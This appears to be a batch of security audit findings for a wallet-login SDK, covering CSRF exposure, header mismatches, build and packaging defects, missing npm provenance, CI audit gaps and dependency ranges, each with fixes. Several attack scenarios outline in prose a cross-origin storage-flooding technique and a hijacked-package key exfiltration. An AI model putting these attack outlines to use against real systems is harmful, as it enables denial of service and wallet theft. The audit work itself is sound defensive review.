raw_findings.description: `ExportKeyPanelProps.autoClearMs` is documented as "Drop the revealed plaintext from state after this many ms. Set to 0 to disable. Default 60_000." The panel forwards it as `autoClearMs > 0 ? autoClearMs : undefined`, and `useExportKey` destructures with `const { autoClearMs = 30_000 } = options`. A JavaScript destructuring default fires on `undefined`, so passing `0` does not disable the timer — it silently becomes the hook's 30 s default, i.e. a *shorter* window than the panel's own 60 s default. (Calling `useExportKey` directly with `{ autoClearMs: 0 }` behaves correctly, because `0` survives destructuring and short-circuits `if (!plaintext || !autoClearMs) return;` — only the panel's translation is wrong.)
raw_findings.attack_scenario: No attacker path; the deviation is fail-safe (the secret is cleared sooner, not later). The concrete harm is integrator surprise: a team that sets `autoClearMs={0}` because their flow requires the key to stay visible while the user transcribes a 64-character seed watches it vanish mid-transcription, and — having read the prop docs — will not look at the timer as the cause. It also means the documented contract of a security-relevant prop cannot be trusted, which is corrosive when the next such prop is not fail-safe.
raw_findings.recommendation: Forward the value verbatim (`useExportKey(wallet, { autoClearMs })`) so `0` reaches the hook's `if (!plaintext || !autoClearMs) return;` guard and genuinely disables the timer, or change the prop documentation to state that `0` falls back to 30 s. Add a test asserting the panel's 0-means-disabled contract.
raw_findings.prior_art_check: `grep -rn "autoClearMs" tests/` returns no matches. tests/react-hooks.test.tsx exercises `useExportKey(wallet)` with no options object at all (line 137), so neither the panel's translation nor the hook's `0` branch is covered.

raw_findings.title: No Origin or Content-Type validation on state-changing routes (header auth blocks session-riding CSRF, but leaves cross-origin drive-by record creation)
raw_findings.description: To answer the CSRF question directly: the authenticated routes are structurally safe. `logout`, `user-data` and `import-wallet` read their credential from the custom headers `config.sessionHeader` / `config.publicKeyHeader` / `config.appIdHeader`, `grep -rni "cookie" src/` returns zero hits so there is no ambient credential, and the SDK emits no `Access-Control-Allow-Origin`, so a cross-origin page can neither attach those headers on a simple request nor survive the preflight. That part is a genuine strength. The residual gap is that no route checks `Origin`, `Sec-Fetch-Site`, or `Content-Type`: `readJson` calls `req.json()` unconditionally, which parses a body regardless of its declared media type. The *unauthenticated* routes (`register`, `challenge`, `login-wallet`, `connect-wallet`) are therefore reachable from arbitrary third-party pages as CORS-"simple" requests (e.g. a `fetch(..., { mode: 'no-cors', headers: { 'content-type': 'text/plain' } })` or an `enctype="text/plain"` form), with no preflight and no origin attribution. Under default config this composes badly with the rate limiter: `trustProxyHeaders` defaults to `false`, so `rateLimited()` skips the IP leg entirely, and the remaining bucket is keyed on the attacker-chosen identifier (`identifier: body.email ?? body.publicKey`), which never collides across distinct random values.
raw_findings.attack_scenario: An attacker embeds a hidden script on any page they can get traffic to (a malvertising slot, a compromised blog, their own site). Each visitor's browser silently fires opaque `POST /victim-app.example/api/auth/register` requests with `content-type: text/plain`, each carrying a freshly generated valid base58 `publicKey`, a random 64-hex `authPublicKey`, and the maximum payload `validateWallets` permits — 16 wallets x 8192-byte `encryptedSecret` = ~128 KB per record. No preflight fires, so the browser never asks the victim origin for permission; no `Origin` check rejects it; the per-identifier bucket is fresh for every random publicKey; and with `allowedAppIds` left unset (the default) each request can also mint a brand-new storage namespace. The attacker writes unbounded 128 KB records into the victim's Redis/Postgres from thousands of third-party IPs simultaneously, with the requests indistinguishable from legitimate signups in the access log and no origin recorded — persistent storage-exhaustion DoS with laundered attribution. The attacker could issue these directly, so this is an amplifier and attribution-laundering primitive rather than a new capability, hence low.
raw_findings.recommendation: Reject state-changing POSTs whose `content-type` is not `application/json` — this alone forces a CORS preflight, which fails closed because the SDK sends no `Access-Control-Allow-Origin`, and costs nothing since `AuthClient.post()` already sets `"content-type": "application/json"` on every call. Optionally add an opt-in `allowedOrigins` config checked against the `Origin` header (fail closed when configured, permissive when not, to preserve non-browser integrations). Separately, document in SECURITY.md that `allowedAppIds` and `trustProxyHeaders` should both be set in production, and consider a global cap on unauthenticated `register` volume that does not depend on an attacker-chosen bucket key.
raw_findings.prior_art_check: `grep -rni "access-control|cors|origin\b|sec-fetch|referer|csrf|samesite" src/ tests/` returns no CSRF, CORS or Origin handling anywhere — the only `origin` hits are unrelated prose in rateLimit.ts:12, session.ts:164/232 and webauthn.ts:11. tests/rate-limit-self-extend.test.ts and tests/rate-limit-sustained-lockout.test.ts cover the counter's self-extension and lockout semantics, not the fresh-bucket-per-random-identifier property. No test sends a non-JSON content-type.

raw_findings.title: Client hardcodes ttc-auth-token / ttc-public-key while the server reads config.sessionHeader / config.publicKeyHeader
raw_findings.description: `authHeaders()` in the browser session module emits the literal strings `"ttc-auth-token"` and `"ttc-public-key"`, while `src/server/routes.ts` reads `req.headers.get(config.sessionHeader)` and `req.headers.get(config.publicKeyHeader)` on all three authenticated routes (lines 490-491, 499-500, 525-526). `AuthClient.authHeaders()` layers the appId on top using the config (`[this.config.appIdHeader]: this.config.appId`), so the appId header IS configurable while the other two are not — an inconsistency inside the same function. `sessionHeader` and `publicKeyHeader` are public, documented `AuthConfig` fields, so an integrator is invited to change them.
raw_findings.attack_scenario: No attacker path; the failure is fail-closed. An integrator overrides `config.sessionHeader: "x-app-session"` on the server (a documented knob, perhaps to avoid a header-name collision with a WAF or another SDK). The browser keeps sending `ttc-auth-token`; the server's `req.headers.get("x-app-session")` returns null; `verifySession` short-circuits on `if (!token || !publicKey) return null;` and every authenticated request 401s. `AuthClient.fetchUserData` maps 401 to `null`, so `AuthProvider` sets `user` to null with no error surfaced anywhere — the app silently shows an account with zero wallets. The bug presents as data loss, not as a config error.
raw_findings.recommendation: Thread the resolved config through: have `AuthClient.authHeaders()` build all three header names from `this.config` (`{ [this.config.sessionHeader]: token, [this.config.publicKeyHeader]: pubKey, [this.config.appIdHeader]: this.config.appId }`), leaving `session.ts`'s helper as a default-config convenience. Alternatively mark `sessionHeader`/`publicKeyHeader` as server-read-only in the `AuthConfig` JSDoc so nobody expects overriding them to work end-to-end.
raw_findings.prior_art_check: `grep -rn "sessionHeader|publicKeyHeader|appIdHeader" src/ tests/` — every hit is in src/core/config.ts, src/server/routes.ts, or src/client/authClient.ts. There is not a single test hit, so no test ever runs the client against a server with non-default header names.

raw_findings.title: Published CJS bundles `require()` an ESM-only dependency — `@tetrac/login-sdk` is unloadable from CommonJS on Node 18/20.0–20.18 despite `engines.node: ">=18"`
raw_findings.category: published-artifact / build correctness (not a security compromise)
raw_findings.description:
The single runtime dependency `@noble/hashes@2.2.0` is ESM-only and declares its own floor at Node 20.19.0:

  node_modules/@noble/hashes/package.json → `"type": "module"`, `"engines": {"node": ">= 20.19.0"}`, and `exports["."] === "./index.js"` / `exports["./sha2.js"] === "./sha2.js"` — plain strings, i.e. there is NO `require` condition and no `.cjs` file anywhere in the package (verified: `ls node_modules/@noble/hashes` shows only `.js`/`.d.ts`/`.map`).

tsup externalizes `dependencies` by default, so every CJS bundle the SDK publishes emits a top-level synchronous `require()` of that ESM package. `require()` of a `"type":"module"` file throws `ERR_REQUIRE_ESM` on Node < 20.19.0 (`require(esm)` was only unflagged in 20.19.0 / 22.12.0).

The package nevertheless advertises `"engines": {"node": ">=18"}` and the CI matrix explicitly tests `node-version: ["18.x", "20.x"]`. CI cannot catch this: every Jest test imports from `../src` (ESM via ts-jest), and the only test that touches `dist` (tests/dual-bundle-vault.test.ts) reads the files as TEXT with `readFileSync` — it never `require()`s them. So the CJS entry points that `main` and `exports["."].require` advertise are never once loaded in CI on any Node version.
raw_findings.attack_scenario: Not attacker-driven — an integrator-facing availability defect. An integrator on Node 18 LTS (a version the package explicitly claims to support) writing a CommonJS Express/Next server does `const { createAuthRoutes } = require("@tetrac/login-sdk/server")` and the process dies at load with `ERR_REQUIRE_ESM` pointing at `@noble/hashes/sha2.js` — an error inside a transitive dependency, with nothing in the SDK's own metadata explaining it. The realistic bad outcome is that the integrator 'fixes' it by pinning an older `@noble/hashes` via `overrides` (silently swapping the audited hash/PBKDF2 implementation the crypto review was performed against) rather than by upgrading Node.
raw_findings.recommendation: Either (a) raise `engines.node` to `>=20.19.0`, drop `18.x` from the CI matrix, and document the floor; or (b) stop externalizing `@noble/hashes` in the CJS pass so the hash code is inlined into `dist/*.cjs` (it has zero transitive deps — `"dependencies": {}` — so bundling it is cheap and also removes a live registry-resolution surface). Independently, add a smoke test that actually `require()`s each published CJS entry point (`node -e 'require("./dist/server/index.cjs")'`) on the lowest supported Node in the matrix — this class of defect is invisible to every test that imports from `src`.
raw_findings.prior_art_check: Grepped `tests/`, `src/`, `audits/` and all root `*.md` for `err_require_esm`, `node 18`, `node18`, `engines`, `20.19`, `esm-only`, `ESM only` — the only hits are unrelated (`SqlDialect` 'engines' prose in src/storage/sql/*.ts, and 'Node 18+ Web Crypto' comments in tests/webauthn-gate.test.ts, tests/biometric-unlock.test.ts, tests/biometric-gate-resistance.test.ts). `audits/` is an empty directory. Read tests/dual-bundle-vault.test.ts in full — it inspects dist only via readFileSync/string matching, never loads it. No prior coverage.

raw_findings.title: No npm provenance, no release workflow, and `dist/` is gitignored — the published tarball is not bound to, or diffable against, the reviewed source
raw_findings.description:
Nothing in this repository binds the artifact on npm to the code in git:

- There is no `publishConfig` block at all, so no `provenance: true` — npm publishes no SLSA/Sigstore attestation, and the npm page shows no 'Built and signed on GitHub Actions' badge.
- `.github/workflows/` contains exactly one file, `ci.yml`. There is no release/publish workflow; `grep -rn "npm publish|NPM_TOKEN|NODE_AUTH_TOKEN|provenance|publishConfig"` across the repo (excluding node_modules/.git/dist) returns only `package.json:89 prepublishOnly` and prose in CLAUDE.md/.claude. Publishing is therefore a manual `npm publish` from a maintainer workstation.
- `files: ["dist"]` ships only built output, and `.gitignore` contains `dist/`. So the tarball contains no source, and the build output is not in version control either.

The combination means a consumer who wants to verify what they installed has no reference point: they cannot diff the tarball against a tagged commit (dist isn't committed), and they cannot check an attestation (none is produced). Reproducing the build requires trusting that the maintainer's local `node_modules`/toolchain matched the lockfile.
raw_findings.attack_scenario: An attacker who obtains the maintainer's npm token (phishing, a compromised laptop, or a stolen CI secret elsewhere) publishes `@tetrac/login-sdk@0.6.1` whose `dist/client/index.js` adds four lines to `generateWalletBundle` that POST the freshly generated plaintext Solana/EVM private key to the attacker's host before encryption. Because the SDK's whole value proposition is that the private key exists in plaintext only in the browser, this is a total, silent compromise of every wallet created by every integrating app after the update. Detection is the issue: there is no provenance attestation to fail, `dist` is not in git so no one can diff tarball-vs-tag, and integrators on `^0.6.0` pull it automatically. This is precisely the eslint-scope / event-stream / ua-parser-js pattern, applied to a package that mints wallet keys.
raw_findings.evidence:
package.json:
    "prepublishOnly": "npm run build",
(no "publishConfig" key anywhere in package.json)

.gitignore:
node_modules/
dist/
*.log

$ ls .github/workflows
ci.yml

$ grep -rn "provenance|publishConfig|npm publish|NPM_TOKEN|NODE_AUTH_TOKEN" . --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist
package.json:89:    "prepublishOnly": "npm run build",   (plus CLAUDE.md / .claude prose only)
raw_findings.recommendation: Add `"publishConfig": { "provenance": true, "access": "public" }` and publish from a tag-triggered GitHub Actions workflow with `permissions: { id-token: write, contents: read }` using an npm granular token scoped to this package only. Enable npm 2FA / trusted publishing on the `@tetrac` scope. Document in SECURITY.md how an integrator verifies provenance (`npm audit signatures`). Until provenance exists, consider committing `dist/` on release tags so the tarball is diffable.
raw_findings.prior_art_check: Grepped the whole repo (excluding node_modules/.git/dist) for `provenance`, `publishConfig`, `npm publish`, `NPM_TOKEN`, `NODE_AUTH_TOKEN` — no hits other than `prepublishOnly` and unrelated skill documentation. `ls .github/workflows` shows only `ci.yml`. `ls audits/` is empty. No prior finding covers release provenance.

raw_findings.title: `prepublishOnly` runs only the build — a release can ship code that never passed typecheck, tests, or the audit gate
raw_findings.description:
`"prepublishOnly": "npm run build"` invokes `tsup` and nothing else. `typecheck`, `test`, and `format:check` exist as separate scripts and are wired into CI, but CI runs on `push`/`pull_request` to `main` only — it is not a publish gate, and there is no branch-protection-equivalent in the repo forcing a green CI before `npm publish`. Since publishing is manual (see the provenance finding) and `dist/` is gitignored, the published bytes are whatever `tsup` produced on the maintainer's working tree at that moment — which may include uncommitted edits.

This compounds a second, local-only integrity gap: `"test": "jest"` does not build first, while CI deliberately does (`# Build BEFORE Test: tests/dual-bundle-vault.test.ts inspects the BUILT dist/`). Right now the checked-out `dist/` is genuinely stale — `find src -newer dist/index.js` returns `src/storage/conformance.ts` and `src/storage/store.ts`. So a local `npm test` asserts the dual-bundle vault-singleton invariant against a bundle that predates the two most recently edited storage source files.
raw_findings.attack_scenario: No external attacker required; this is the failure mode that lets a mistake reach the registry. A maintainer applies a fix to `src/client/session.ts` (say, the vault-singleton `Symbol.for("tetrac.vault")` indirection), runs `npm test` locally — which passes because dual-bundle-vault.test.ts reads the STALE pre-fix `dist/` and the string assertions happen to still match — then runs `npm publish`, whose `prepublishOnly` rebuilds but runs no tests. The regression ships. Consumers see `getAppKey()` return null from `/client` ("Vault is locked") after a successful `/react` login, i.e. a broken non-custodial signing path in production.
raw_findings.evidence:
package.json:
    "test": "jest",
    ...
    "prepublishOnly": "npm run build",

.github/workflows/ci.yml:111-118:
      # Build BEFORE Test: tests/dual-bundle-vault.test.ts inspects the BUILT dist/
      # (a bundling-artifact invariant), which doesn't exist in a fresh CI checkout
      # until the build runs. Running Test first fails with "Built dist not found".
      - name: Build
        run: npm run build
      - name: Test
        run: npm test

$ find src -newer dist/index.js -type f
src/storage/conformance.ts
src/storage/store.ts
raw_findings.recommendation: Change to `"prepublishOnly": "npm run typecheck && npm run build && npm test"` (build must precede test for the dist-inspecting suite). Also make `test` depend on a build — e.g. `"pretest": "tsup"` or a jest `globalSetup` that rebuilds — so the dist-reading invariant test can never pass against a stale bundle on a developer machine. Best: gate publishing on a tag-triggered workflow that reuses the CI job.
raw_findings.prior_art_check: Read `.github/workflows/ci.yml` in full and `package.json` scripts in full. Grepped tests/ for build-related assertions: only tests/dual-bundle-vault.test.ts inspects dist, and its `beforeAll` only checks `existsSync` — it has no freshness/mtime check, so staleness is explicitly not covered. No test asserts anything about `prepublishOnly`.

raw_findings.title: CI security-audit step is advisory-only (`continue-on-error: true`) and is currently failing with 4 high advisories
raw_findings.description:
The `npm audit --audit-level=high` step is marked `continue-on-error: true`, so it can never fail a build. It is failing today: `npm audit` reports 8 vulnerabilities (1 low, 3 moderate, 4 high).

Breaking them down honestly against what actually ships:
- `brace-expansion` (<=1.1.17, 3 high DoS advisories), `js-yaml` (<=3.14.2, 2 high), `esbuild` (0.27.3–0.28.0, low) — devDependency-only, not in the tarball, and `npm audit --json` reports `dependencies.prod = 2`. Build-time exposure only.
- `ws` 8.0.0–8.20.1 (high, memory-exhaustion DoS) via `viem` — this one DOES reach consumers, because `viem` is a NON-optional peerDependency. The declared peer range `^2.46.0` does permit patched `viem` >= 2.54.2, so the SDK's contract is not itself vulnerable; but the lockfile pins `viem@2.52.2`, so CI builds and tests against the vulnerable version and the range gives no signal to integrators.
- `uuid` <11.1.1 → `jayson` → `@solana/web3.js` (moderate) — same shape, via the non-optional `@solana/web3.js` peer.

The step's own comment acknowledges the gate is deferred: "Promote to a hard gate by removing `continue-on-error` once the dependency surface is clean." That day has not arrived, and with no failure signal nothing forces it to.
raw_findings.attack_scenario: No direct compromise of the SDK. The concrete consequence is loss of detection: because the step is non-blocking and permanently red, a genuinely reachable future advisory against `@noble/hashes`, `tweetnacl`, `@solana/web3.js`, or `viem` — the four packages that touch key material and signature verification — produces exactly the same green checkmark as today's dev-only noise. A maintainer scanning CI status has no way to distinguish 'four DoS advisories in Jest's transitive minimatch' from 'a signature-forgery advisory in the ed25519 verifier'.
raw_findings.evidence:
.github/workflows/ci.yml:120-125:
      # Non-blocking: audit results depend on the upstream advisory DB and can
      # change without any code change. Promote to a hard gate by removing
      # `continue-on-error` once the dependency surface is clean.
      - name: Security audit (non-blocking)
        run: npm audit --audit-level=high
        continue-on-error: true

$ npm audit
8 vulnerabilities (1 low, 3 moderate, 4 high)
  ws  8.0.0 - 8.20.1  (high) → node_modules/viem/node_modules/ws → viem  <=2.54.1

$ npm audit --json | jq .metadata.dependencies
{ "prod": 2, "dev": 637, "optional": 54, "peer": 12 }
raw_findings.recommendation: Split the step in two: a BLOCKING `npm audit --omit=dev --audit-level=high` (only 2 prod deps — this should be trivially green and will actually fire when a shipped dependency is hit), plus the existing non-blocking full audit for dev noise. Separately bump the `viem` devDependency/lockfile past 2.54.1 so CI stops testing against the vulnerable `ws`, and raise the `viem` peer range floor to the patched version so integrators get a resolution signal.
raw_findings.prior_art_check: Read `.github/workflows/ci.yml` and `.github/dependabot.yml` in full. Grepped `tests/` and `src/` for `npm audit`, `supply`, `dependen` — no hits. `audits/` is empty. No test or prior finding addresses the CI audit gate.

raw_findings.title: Unbounded major-version peer ranges (`better-sqlite3: ">=9"`, `next: ">=14"`, `react: ">=18"`) on drivers the SDK only duck-types
raw_findings.description:
Three peers have no upper bound at all. `better-sqlite3: ">=9"` is the notable one, because the SDK never imports it — `src/storage/sql/drivers.ts` types it structurally as `SqliteLike` — and the driver shim is behaviour-coupled to a specific better-sqlite3 quirk:

  src/storage/sql/drivers.ts:174-184 catches a THROW from `stmt.all(...)` to detect a no-result-column statement and falls back to `stmt.run(...)`, reading `info.changes`.

A future better-sqlite3 major that returns `[]` from `.all()` on a `DELETE` instead of throwing, or that goes async, would silently satisfy `>=9`: TypeScript still structurally matches `{prepare, exec}`, no import ever fails, and the `try/catch` simply stops firing. The blast radius today is bounded — `affected` is consumed only by the expired-row sweeper (`src/storage/sql/engine.ts:306`, `removed += ...`), a GC counter, and the SQLite dialect uses `RETURNING 1 AS affected` for the security-relevant atomic delete (`src/storage/sql/dialects/sqlite.ts:43`) — so this is not currently a correctness break. It is a latent one, with no guard: `SqlDialect.preflight` checks engine/schema properties but nothing asserts a driver version.

Worth contrasting with the one dependency the SDK fully controls, `@noble/hashes`, which is pinned EXACTLY (`"2.2.0"`, no caret). The security-critical peers do not get the same treatment: `tweetnacl: "^1.0.3"` and `@solana/web3.js: "^1.98.0"` are the ed25519 verifier and the base58 pubkey parser behind every server-side login check, on floating caret ranges.
raw_findings.attack_scenario: Two paths, both requiring a future upstream event. (a) Correctness: better-sqlite3 v13 ships with `.all()` no longer throwing on result-less statements; an integrator's `npm install` resolves it under `>=9`, preflight boots happily, and `sweepExpired` silently reports 0 removals forever — expired sessions/challenges accumulate until the table degrades. (b) Supply chain: a hijacked `tweetnacl@1.0.4` publish is auto-accepted by `^1.0.3` on every integrator's next install, and `nacl.sign.detached.verify` (src/server/signature.ts:47, 51, 74) is the single function standing between an attacker and authenticating as any wallet or any email account — a backdoored verify returning `true` is a full auth bypass. The SDK's exact-pin discipline for `@noble/hashes` shows the risk is understood; it is just not applied to the verifier.
raw_findings.recommendation: Bound the ranges: `better-sqlite3: ">=9 <13"`, `next: ">=14 <17"`, `react: ">=18 <20"`, and let Dependabot widen them deliberately after the conformance suite passes on the new major. Add a version assertion to the SQLite preflight (better-sqlite3 exposes `db.name`/`VERSION`) rather than relying on the structural type. For `tweetnacl` and `@solana/web3.js`, document in SECURITY.md that integrators should commit a lockfile and consider `overrides` pinning, since a caret range on the verifier is the highest-value hijack target in the tree.
raw_findings.prior_art_check: Read `src/storage/sql/drivers.ts` (SqliteLike + sqliteDriver), `src/storage/sql/engine.ts:300-306`, `src/storage/sql/dialects/sqlite.ts:43`, and `src/storage/sql/types.ts` (preflight contract). Grepped `src/storage/sql/*.ts` for `version|preflight` — preflight exists but performs no driver-version check. Grepped `tests/` for peer-range or version assertions: tests/sql-conformance-sqlite.test.ts and tests/sql-dialects.test.ts exercise behaviour against the installed driver only; nothing pins or asserts a version. Not previously covered.

raw_findings.title: `dist/ui` resolves its React layer through the bare self-referential specifier `@tetrac/login-sdk/react`, allowing cross-version resolution
raw_findings.description:
The `/ui` entry marks `@tetrac/login-sdk/react` as external, so the built UI bundle imports its own package by NAME rather than by relative path — confirmed in the shipped output:

  dist/ui/index.js:8,232,284,769  → `import { useAuth } from "@tetrac/login-sdk/react";`
  dist/ui/index.cjs:35,259,311,796 → `require("@tetrac/login-sdk/react")`

The stated purpose (tsup.config.ts:27-32) is correct and important: inlining `useAuth`/`AuthContext` into `dist/ui` would create two AuthContext instances. But a bare specifier is resolved by the CONSUMER's resolver, not pinned to the emitting package. Node's self-reference rule maps it back to the same package, and a flat single-install npm tree does too. A tree with two copies of `@tetrac/login-sdk` — pnpm's strict layout, a monorepo where one workspace pins 0.5.x and another 0.6.0, or any transitive dependency depending on the SDK — can resolve `dist/ui@0.6.0`'s import to `dist/react@0.5.x`.

The existing regression test asserts the specifier is PRESENT but says nothing about which version it resolves to, so the guard is one-sided:

  tests/dual-bundle-vault.test.ts:129  `expect(uiSrc).toMatch(/from\s+["']@tetrac\/login-sdk\/react["']/);`

Also note the package does not list itself in `dependencies`, so nothing constrains the resolved version.
raw_findings.attack_scenario: Not attacker-initiated; a mixed-version install produces it. An app installs `@tetrac/login-sdk@0.6.0` directly and also depends on an internal component library that pins `@tetrac/login-sdk@0.5.0`; under pnpm (or npm nested resolution) both are present. `<LoginPanel>` from `dist/ui@0.6.0` calls `useAuth` resolved out of `dist/react@0.5.0`, which is a different module instance holding a different `Symbol.for("tetrac.vault")`-backed context binding — the user completes login through the 0.6.0 `<AuthProvider>`, and the panel reads an unpopulated context, or worse silently exercises a 0.5.0 code path that predates the session/vault fixes shipped in 0.6.0. Failure is a broken or subtly-downgraded auth flow rather than key disclosure, hence low.
raw_findings.recommendation: Prefer a relative external (`../react/index.js`) so `/ui` can only ever bind to the React layer it was built with — it achieves the same de-duplication goal without depending on consumer resolution. If the bare specifier is kept for bundler-interop reasons, add a runtime version handshake: have `/react` export a `__SDK_VERSION` constant and have `/ui` assert it matches its own build-time version, throwing a clear 'two copies of @tetrac/login-sdk are installed' error instead of failing as a mysterious empty context.
raw_findings.prior_art_check: Read `tests/dual-bundle-vault.test.ts` in full — it covers the ORIGINAL bug (per-bundle `var memoryAppKey`) and the `Symbol.for("tetrac.vault")` singleton fix, and asserts `/ui` inlines zero vault state and imports the bare specifier. It does NOT assert anything about the resolved version or about duplicate installs. Grepped tests/ for `@tetrac/login-sdk/react` — that line 129 assertion is the only hit. Version skew is not previously covered.

raw_findings.title: Shipped README.md is 0 bytes; SECURITY.md and CHANGELOG.md are empty — a wallet-key SDK publishes with no integrator security guidance and no disclosure channel
raw_findings.description:
`npm pack --dry-run` confirms `README.md` is included in the tarball at 0 bytes, so the npm registry page for a package that generates and holds wallet private keys client-side renders empty. `SECURITY.md` (0 bytes) and `CHANGELOG.md` (0 bytes) exist but are also empty and are not published at all (`files: ["dist"]` excludes them, and GitHub therefore shows no 'Report a vulnerability' policy content).

This matters more than usual here because the SDK's security posture depends on integrator choices that are only documented in code comments: which storage backend to configure (`selectStorageBackend` throws in production without one — src/storage/resolve.ts:47-53), that MySQL requires `STRICT_ALL_TABLES` or wallet blobs truncate (.github/workflows/ci.yml:70-73), that `skipPreflight` must not be set (src/storage/sql/index.ts:45-50), and that a Supabase `public` schema is world-readable by default. None of that reaches a consumer reading the npm page.
raw_findings.attack_scenario: No direct exploit. Two second-order effects: (1) an integrator ships with a misconfigured backend or `skipPreflight: true` because the guidance lives only in source comments they never open, and (2) a researcher who finds a real vulnerability has no published disclosure channel — GitHub's security policy is empty and the npm page is blank — so the likely outcomes are a public issue on the tracker or no report at all. For a package whose failure mode is user wallet loss, an absent coordinated-disclosure path is a meaningful gap.

raw_findings.recommendation: Populate SECURITY.md with a disclosure address and supported-version window, and write a README that states the threat model explicitly: what the server can and cannot see, that losing the passkey means losing the wallet, the production storage requirements (no localhost fallback, MySQL STRICT_ALL_TABLES, never `skipPreflight`), and the Supabase RLS/`public`-schema warning. Add `SECURITY.md` and `CHANGELOG.md` to the `files` allowlist so they ship with the tarball.
